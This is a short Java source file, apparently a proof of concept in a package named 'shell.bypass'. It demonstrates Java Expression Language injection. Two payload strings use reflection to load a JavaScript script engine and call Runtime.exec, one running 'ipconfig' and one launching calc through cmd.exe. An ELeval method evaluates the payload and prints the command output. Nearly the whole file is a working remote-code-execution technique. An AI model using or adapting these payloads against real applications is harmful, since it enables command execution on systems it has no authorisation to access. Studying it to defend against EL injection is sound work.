package shell.bypass;

import javax.el.ELManager;
import javax.el.ExpressionFactory;
import javax.el.StandardELContext;
import javax.el.ValueExpression;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class test3 {
    public static void main(String[] args) throws Exception {
        String payload = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var exp='ipconfig';java.lang.Runtime.getRuntime().exec(exp);\")";

        String poc = "''.getClass().forName('javax.script.ScriptEngineManager')" +
                ".newInstance().getEngineByName('nashorn')" +
                ".eval(\"s=[3];s[0]='cmd.exe';s[1]='/c';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);\")";
        ELeval(payload);
    }

    public static void ELeval(String payload) throws Exception{
        ELManager elManager = new ELManager();
        StandardELContext elContext = elManager.getELContext();//获得this.context
        ExpressionFactory expressionFactory = elManager.getExpressionFactory();//然后this.factory=expressionFactory
        /*
        private static String bracket(String expression) {
            return "${" + expression + "}";
         }
         */
        ValueExpression valueExpression = expressionFactory.createValueExpression(elContext, "${" + payload + "}", Object.class);
        InputStream inputStream = ((Process) valueExpression.getValue(elContext)).getInputStream();

        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
        String line;
        while ((line=bufferedReader.readLine())!=null){
            System.out.println(line);
        }
        bufferedReader.close();
    }
}
